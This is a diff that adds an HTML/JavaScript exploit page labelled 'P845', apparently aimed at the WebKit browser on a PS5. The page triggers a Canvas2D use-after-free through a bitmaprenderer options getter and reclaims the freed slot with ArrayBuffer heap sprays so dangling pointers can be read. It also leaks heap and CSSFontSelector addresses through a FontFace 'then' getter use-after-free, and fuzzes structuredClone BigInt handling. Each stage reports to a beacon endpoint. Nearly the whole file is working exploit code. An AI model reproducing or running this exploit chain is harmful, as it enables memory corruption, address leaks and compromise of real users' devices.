@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P845</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P845: V527-style AB(768) Reclaim + structuredClone BigInt Desync</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P845-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms)});}
+
+bn('BOOT','start');
+
+/* ============================================================
+   TEST 1 (runs FIRST — timing sensitive):
+   V527-style AB(768) Reclaim of Freed Canvas2D
+
+   Key insight from pastawithpesto: IsoHeap is LIKELY OFF on PS5.
+   WTF_MAKE_ISO_ALLOCATED => WTF_MAKE_FAST_ALLOCATED => FastMalloc
+   on FreeBSD/PlayStation (no libpas/BEFIT infrastructure).
+
+   Our P820 crashes were from GC hitting m_canvas=0, NOT from
+   IsoHeap blocking reclaim. V527 reads BEFORE GC sweep.
+
+   Flow: BMR UAF → same-type alias → free aliased → GC churn →
+         AB(768) spray with marker → read through stale wrapper
+   ============================================================ */
+log('=== TEST 1: V527-style AB(768) Canvas2D Reclaim ===','hot');
+
+var staleCtx=null;
+var aliasIdx=-1;
+
+/* Step 1: BMR trigger to create UAF */
+var c1=document.createElement('canvas');
+c1.width=8;c1.height=8;
+document.body.appendChild(c1);
+
+var uafFired=false;
+var opts={};
+Object.defineProperty(opts,'alpha',{
+  get:function(){
+    if(!uafFired){
+      uafFired=true;
+      try{staleCtx=c1.getContext('2d');}catch(e){}
+    }
+    return true;
+  }
+});
+var bmrCtx=c1.getContext('bitmaprenderer',opts);
+bn('T1-UAF','fired='+uafFired+'|stale='+(!!staleCtx));
+log('  UAF fired='+uafFired+' staleCtx='+(!!staleCtx),'info');
+
+/* Step 2: Same-type reclaim — 500 Canvas2D spray */
+var sprayCvs=[];
+for(var i=0;i<500;i++){
+  var sc=document.createElement('canvas');
+  sc.width=4;sc.height=4;sc.id='s'+i;
+  var sctx=sc.getContext('2d');
+  sctx.lineWidth=1.0+i*0.001;
+  sprayCvs.push({c:sc,ctx:sctx});
+}
+
+/* Step 3: Find alias */
+var aliasId='?';
+try{aliasId=staleCtx.canvas.id;}catch(e){
+  bn('T1-ALIAS-ERR',e.name);
+  log('  alias read err: '+e.name,'fail');
+}
+if(aliasId&&aliasId[0]==='s'){
+  aliasIdx=parseInt(aliasId.slice(1),10);
+  log('  Alias found at spray['+aliasIdx+']!','ok');
+  bn('T1-ALIAS','idx='+aliasIdx);
+} else {
+  log('  No alias (id='+aliasId+')','fail');
+  bn('T1-NOALIAS','id='+aliasId);
+}
+
+/* Step 4: Verify alias bidirectionally */
+if(aliasIdx>=0){
+  try{
+    var origLW=staleCtx.lineWidth;
+    staleCtx.lineWidth=7777.77;
+    var rb=sprayCvs[aliasIdx].ctx.lineWidth;
+    var match=(rb===7777.77);
+    log('  Alias verify: wrote 7777.77, read='+rb+' match='+match,'info');
+    bn('T1-VERIFY','origLW='+origLW+'|rb='+rb+'|match='+match);
+    staleCtx.lineWidth=origLW;
+  }catch(e){
+    log('  Alias verify err: '+e.name,'fail');
+    bn('T1-VERIFY-ERR',e.name);
+  }
+}
+
+/* Step 5: Free the aliased Canvas2D (V527 approach)
+   Drop canvas element + ctx ref → Canvas2D goes back to free list.
+   staleCtx remains as a DANGLING POINTER to the freed 768B slot. */
+if(aliasIdx>=0){
+  bn('T1-FREE-PRE','idx='+aliasIdx);
+  log('  Freeing aliased canvas spray['+aliasIdx+']...','info');
+
+  var target=sprayCvs[aliasIdx];
+  sprayCvs[aliasIdx]=null;
+  try{target.c.remove();}catch(e){}
+  target.c=null;
+  target.ctx=null;
+  target=null;
+
+  /* STRONG GC pressure — 64MB of allocation churn (V527 uses 192MB)
+     Use Float64Array since these are 8-byte aligned and large */
+  bn('T1-GC-START','64mb');
+  for(var i=0;i<32;i++){
+    var tmp=new Float64Array(262144); /* 2MB each, 32x = 64MB */
+    tmp[0]=i; /* prevent optimization */
+  }
+  bn('T1-GC-DONE','churn-complete');
+  log('  GC pressure: 64MB churn done','ok');
+}
+
+/* Step 6: AB(768) spray + immediate read (inside setTimeout for GC to settle) */
+setTimeout(function(){
+  if(aliasIdx<0){
+    bn('T1-SKIP','no-alias');
+    log('  Skipping AB spray (no alias)','fail');
+    runTest2();
+    return;
+  }
+
+  /* Spray 500 AB(768) with marker value */
+  bn('T1-SPRAY-PRE','n=500');
+  var MARKER=9999.99;
+  var abs768=[];
+  for(var i=0;i<500;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    /* Fill every 8 bytes with marker as float64 */
+    for(var off=0;off<768;off+=8)dv.setFloat64(off,MARKER,true);
+    abs768.push(ab);
+  }
+  bn('T1-SPRAY-DONE','n=500');
+  log('  Sprayed 500 AB(768) with marker 9999.99','ok');
+
+  /* THE CRITICAL READ — immediately, before GC sweep */
+  bn('T1-READ-PRE','about-to-read');
+  var lwResult='?',gaResult='?',fsResult='?',mlResult='?';
+
+  /* lineWidth — float64 getter, NO string alloc, NO GC risk */
+  try{
+    lwResult=String(staleCtx.lineWidth);
+    bn('T1-LW',lwResult);
+  }catch(e){
+    lwResult='ERR:'+e.name;
+    bn('T1-LW-ERR',e.name);
+  }
+
+  /* globalAlpha — float64 immediate, NO string alloc */
+  try{
+    gaResult=String(staleCtx.globalAlpha);
+    bn('T1-GA',gaResult);
+  }catch(e){
+    gaResult='ERR:'+e.name;
+    bn('T1-GA-ERR',e.name);
+  }
+
+  /* miterLimit — float64 getter */
+  try{
+    mlResult=String(staleCtx.miterLimit);
+    bn('T1-ML',mlResult);
+  }catch(e){
+    mlResult='ERR:'+e.name;
+    bn('T1-ML-ERR',e.name);
+  }
+
+  /* fillStyle — string alloc (GC risk but DAZ-free, needed for pointer bytes) */
+  try{
+    fsResult=String(staleCtx.fillStyle);
+    bn('T1-FS',fsResult);
+  }catch(e){
+    fsResult='ERR:'+e.name;
+    bn('T1-FS-ERR',e.name);
+  }
+
+  var reclaimed=(lwResult==='9999.99');
+  log('  lineWidth='+lwResult+' (RECLAIM='+(reclaimed?'YES!':'no')+')','hot');
+  log('  globalAlpha='+gaResult,'info');
+  log('  miterLimit='+mlResult,'info');
+  log('  fillStyle='+fsResult,'info');
+
+  bn('T1-RESULT','lw='+lwResult+'|ga='+gaResult+'|ml='+mlResult+'|fs='+fsResult+'|reclaim='+reclaimed);
+
+  /* If reclaimed, also test save() (lazy, no m_canvas deref) */
+  if(reclaimed){
+    try{
+      staleCtx.save();
+      bn('T1-SAVE','ok');
+      log('  save() survived after reclaim!','ok');
+    }catch(e){
+      bn('T1-SAVE-ERR',e.name);
+      log('  save() err: '+e.name,'fail');
+    }
+
+    /* Check which AB has the modified save counter */
+    var saveHitIdx=-1;
+    for(var i=0;i<abs768.length;i++){
+      var u32=new Uint32Array(abs768[i]);
+      /* m_unrealizedSaveCount at offset ~592 = u32 index 148 */
+      if(u32[148]===1){saveHitIdx=i;break;}
+    }
+    if(saveHitIdx>=0){
+      log('  save() counter hit AB['+saveHitIdx+']! Reclaim DOUBLE-CONFIRMED','ok');
+      bn('T1-SAVE-HIT','idx='+saveHitIdx);
+    }
+  }
+
+  /* If NOT reclaimed but no crash, try bigger spray */
+  if(!reclaimed && lwResult!=='ERR:TypeError'){
+    log('  No reclaim but no crash — lineWidth reads from stale ctx','info');
+    bn('T1-STALE-READ','lw='+lwResult);
+  }
+
+  runTest2();
+},1200); /* 1200ms matches V527 timing — GC needs time to free Canvas2D */
+
+/* ============================================================
+   TEST 2: FontFace UAF for heap address (H + q13)
+   Runs AFTER Canvas test to avoid allocation interference.
+   ============================================================ */
+function runTest2(){
+  log('','');
+  log('=== TEST 2: FontFace UAF (H + q13) ===','hot');
+
+  var fontAB=null,H=null,q13val=null;
+  var stF=document.createElement('style');
+  stF.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(stF);
+  var faceF=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(faceF);
+  void faceF.loaded;
+
+  var ffiredF=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(ffiredF)return undefined;
+      ffiredF=true;
+      if(stF){stF.remove();stF.textContent='';stF=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      var abs=[];
+      for(var i=0;i<80;i++)abs.push(new ArrayBuffer(192));
+      for(var i=0;i<abs.length;i++){
+        var bu=new BigUint64Array(abs[i]);
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){fontAB=abs[i];break;}
+        }
+        if(fontAB)break;
+      }
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f1, bb1','AB');
+
+  /* Give font load time to complete */
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    if(fontAB){
+      var bu=new BigUint64Array(fontAB);
+      H=bu[11]-BigInt(0x68);
+      q13val=bu[13];
+      log('  H = '+hexQ(H),'ok');
+      log('  q13 = '+hexQ(q13val)+' (CSSFontSelector*)','ok');
+      bn('T2-HEAP','H='+hexQ(H)+'|q13='+hexQ(q13val));
+    } else {
+      log('  FontFace UAF missed (no residue in AB)','fail');
+      bn('T2-MISS','no-hit');
+    }
+
+    runTest3();
+  },500);
+}
+
+/* ============================================================
+   TEST 3: structuredClone BigInt wire-width desync (cand-b-psych)
+   From pastawithpesto. Safe — worst case exception.
+   Runs LAST to avoid polluting Canvas UAF heap.
+   ============================================================ */
+function runTest3(){
+  log('','');
+  log('=== TEST 3: structuredClone BigInt Desync ===','hot');
+
+  var t3results=[];
+  function t3v(id,label,fn){
+    bn('T3-A'+id,label);
+    try{
+      var out=fn();
+      t3results.push(id+':OK:'+out);
+      bn('T3-B'+id,out);
+      log('  T3.'+id+' '+label+': '+out,'ok');
+    }catch(e){
+      t3results.push(id+':ERR:'+e.name);
+      bn('T3-E'+id,e.name+'|'+String(e.message).slice(0,80));
+      log('  T3.'+id+' '+label+': '+e.name+' '+String(e.message).slice(0,60),'fail');
+    }
+  }
+
+  /* v0: control — 256 BigInts (safe) */
+  t3v(0,'safe-256',function(){
+    var big=[];for(var i=0;i<256;i++)big.push(1n<<(40n+BigInt(i%60)));
+    var ok=structuredClone([big,{m:0x51},[1,2,3]]);
+    return 'len='+ok.length+'|b0='+ok[0].length;
+  });
+
+  /* v1: 65536 BigInts + array — trigger m_gcBuffer overflow */
+  t3v(1,'bigint-65k',function(){
+    var big=[];for(var i=0;i<65536;i++)big.push(1n<<(40n+BigInt(i%60)));
+    var arr=[big,new Array(0x8000)];
+    var out=structuredClone(arr);
+    var nz=0;for(var j=0;j<Math.min(out[1].length,200);j++)if(out[1][j]!==undefined)nz++;
+    return 'len='+out.length+'|a1len='+out[1].length+'|nz200='+nz;
+  });
+
+  /* v2: 255/256 boundary BigInt */
+  t3v(2,'boundary-255',function(){
+    var arr=[];
+    for(var i=0;i<260;i++)arr.push(i===255?1n:('str'+i));
+    var ok=structuredClone(arr);
+    return 'len='+ok.length+'|t255='+typeof ok[255]+'|v255='+String(ok[255]).slice(0,20)+'|t256='+typeof ok[256];
+  });
+
+  /* v3: 65535 boundary BigInt — where uint16 wraps */
+  t3v(3,'boundary-65535',function(){
+    var arr=[];
+    for(var i=0;i<65540;i++){
+      if(i===65535)arr.push(42n);
+      else arr.push(i<256?('s'+i):i);
+    }
+    var ok=structuredClone(arr);
+    return 'len='+ok.length+'|t65535='+typeof ok[65535]+'|v65535='+String(ok[65535]).slice(0,20);
+  });
+
+  /* v4: at() with negative index after BigInt pool push */
+  t3v(4,'at-negative',function(){
+    var big=[];for(var i=0;i<300;i++)big.push(BigInt(i)*BigInt(i));
+    var ok=structuredClone(big);
+    /* Test at() with negative indices — if m_size overflowed, at() might go OOB */
+    var r=[];
+    try{r.push('at-1='+String(ok.at(-1)).slice(0,10));}catch(e){r.push('at-1=ERR');}
+    try{r.push('at-2='+String(ok.at(-2)).slice(0,10));}catch(e){r.push('at-2=ERR');}
+    try{
+      var neg=ok.at(-ok.length-1);
+      r.push('oob='+(neg===undefined?'undef':typeof neg));
+    }catch(e){r.push('oob=ERR:'+e.name);}
+    return r.join('|');
+  });
+
+  bn('T3-DONE',t3results.join('|'));
+
+  log('','');
+  log('====== P845 COMPLETE ======','hot');
+  bn('DONE','alias='+aliasIdx+'|t3n='+t3results.length);
+}
+</script></body></html>
